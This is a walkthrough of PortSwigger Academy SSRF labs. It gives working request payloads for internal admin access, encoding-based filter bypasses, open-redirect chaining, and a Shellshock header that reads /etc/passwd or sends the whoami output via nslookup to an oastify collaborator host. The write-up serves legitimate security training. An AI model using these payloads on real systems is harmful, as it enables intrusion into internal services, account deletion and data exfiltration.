# SSRF (Labs: Portswigger Academy)

SSRF: Server-side Request Forgery

### Labs from PortSwigger Academy

#### Lab 1: Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

```
stock check request:
POST /product/stock

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

editing the stockApi data to http://localhost/admin reveals Admin Panel
From which we can find the request to delete user carlos


POST /product/stock

stockApi=http://localhost/admin/delete?username=carlos
```

#### Lab 2: Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

```
same as before, instead of localhost, ip is used.

stock check request:
POST /product/stock

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1


admin interface is running internally 192.168.0.X on port 8080

stock check request:
POST /product/stock

stockApi=http://192.168.0.X:8080/admin

we bruteforce the last octet of the ip, valid one gives us admin interface. From there we get idea on how to delete user carlos

POST /product/stock

stockApi=http://192.168.0.33:8080/admin/delete?username=carlos


```

#### Lab 3: Blind SSRF with out-of-band detection

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

```
Webapp is using Referer header's url when product page is loaded.
So, we can simply put our malicious (burp collaborator url) on the referrer header.

request:
GET /product?productId=1 HTTP/2
Host: 0afc009703d4df0e80fb084d00dd0015.web-security-academy.net
Cookie: session=Dj349B7k9U2<snip>YRMYbhbIKrehY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://s3wz5wz7mjqoajfnhaexs4y42v8mwck1.oastify.com



```

#### Lab 4: SSRF with blacklist-based input filter

This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

```
request to check product stock:

POST /product/stock HTTP/2

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1


editing the request as
POST /product/stock HTTP/2

stockApi=http://localhost/


This gives "External stock check blocked for security reasons"

this can be bypassed by double url encoding localhost

stockApi=http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34/

response: 200 OK

but if we try to access /admin it again gives blocked for security reasons.

stockApi=http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34/admin

response:
"External stock check blocked for security reasons"


This WAF can be bypassed by gain double url encoding `admin`

request:
stockApi=http://%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65


now the WAF is bypassed we get link to delete user carlos
/admin/delete?username=carlos


final request:

stockApi=http://%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos

```

other method.

```
instead of localhost, we can use
127.0.0.1
127.1      (IP shortening)
2130706433   (decimal version of 127.0.0.1)
017700000001  (octal notation)
```

#### Lab 5: SSRF with filter bypass via open redirection vulnerability

This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

There are two interesting requests to work with.

First: Product Stock check.

```
POST /product/stock

stockApi=/product/stock/check?productId=1&storeId=1
```

we cannot tamper with stockApi as of now, because the data of stockApi is being attached to some website. eg: `http://stock.weliketoshop.net:8080/`

Second request: Next Product redirection

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2
```

This request is vulnerable to open redirect. Specially path variable.

we can use this open redirect url in stockApi variable to get access to admin panel.

```
request:
POST /product/stock
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin


and then delete user carlos as

stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
```

🟪🟪EXPERT LAB 🟪🟪

#### Lab 6: Blind SSRF with Shellshock exploitation

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

SHELLSHOCK example

```
GET http://notes.dollarboysushil.com HTTP/1.1
User-Agent: THE OG BROWSER
Host: notes.dollarboysushil.com
Referer: () { :;}; echo "NS:" $(</etc/passwd)
```

1. Server is vulnerable to blind SSRF (in Referer header)
2. Server is vulnerable to Shellshock (in User-Agent header) **The Analogy:**

Think of it like a malicious postal service.

1. You (`Your Browser`) give a package to the local post office (`The Vulnerable Web Server`).
2. You tell the post office: "Please deliver this to `192.168.0.105`" (this instruction is in the **`Referer`** header).
3. Inside the package is a note that says: "Whoever opens this, please tell your name to a public announcement system" (this is the **`User-Agent`** header with the Shellshock payload).
4. The post office (`The Vulnerable Web Server`) dutifully delivers your package to the internal address `192.168.0.105`.
5. The person at `192.168.0.105` (`The Internal, Shellshock-Vulnerable Server`) opens the package. They are compelled to follow the instructions inside (because of the Shellshock bug) and shout their name (`peter`) into the public announcement system (`Burp Collaborator via DNS`).
6. You, listening to the announcement system, hear the name "peter" and now know who opened the package.

```
request

GET /product?productId=1 HTTP/2
Host: 0af7001b03eb1e2788219d4400c80010.web-security-academy.net
Cookie: session=Baok3fsVovJEKFavzl9JOb3q6akTUW14
User-Agent: () { :;}; /usr/bin/nslookup $(whoami).0xy7z4tfgrkw4r9vbi85mcscw32uqmeb.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.0.1:8080
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

we need to bruteforce the last octet of ip.

successful brute force gives following output in the burp collaborator

```
The Collaborator server received a DNS lookup of type A for the domain name **peter-FAMjs2.0xy7z4tfgrkw4r9vbi85mcscw32uqmeb.oastify.com**.
```

#### Lab 7: SSRF with whitelist-based input filter

This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. The developer has deployed an anti-SSRF defense you will need to bypass.

```
request:
POST /product/stock
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1


edited request:
POST /product/stock
stockApi=http://localhost

response:
"External stock check host must be stock.weliketoshop.net"

```

Findings 1 (webapp accepts credentials embed on the url before the hostname using @ character) request `stockApi=https://username@stock.weliketoshop.net` response `Internal Server Error. Could not connect to external stock check service.`

Findings 2 request `stockApi=https://username#@stock.weliketoshop.` response `"External stock check host must be stock.weliketoshop.net"`

This means application is taking the content infront of # as an url and the content after # is taken as element in the page.

Exploitation

```
request:
POST /product/stock
stockApi=https://username%2523@stock.weliketoshop.net

double url encoding # gives us 
Internal Server Error. Could not connect to external stock check service.


request:
POST /product/stock
stockApi=http://localhost%2523@stock.weliketoshop.net

this gives us access to localhost

request:
POST /product/stock
stockApi=http://localhost%2523@stock.weliketoshop.net/admin

response
200 OK


deleting user carlos
POST /product/stock
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Explanation `stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos` decode form `stockApi=http://localhost#@stock.weliketoshop.net/admin/delete?username=carlos`

The webapp is taking `localhost` --> as url `@stock.weliketoshop.net` --> element of the url `/admin/delete?username=carlos` --> viewed as the path for the url
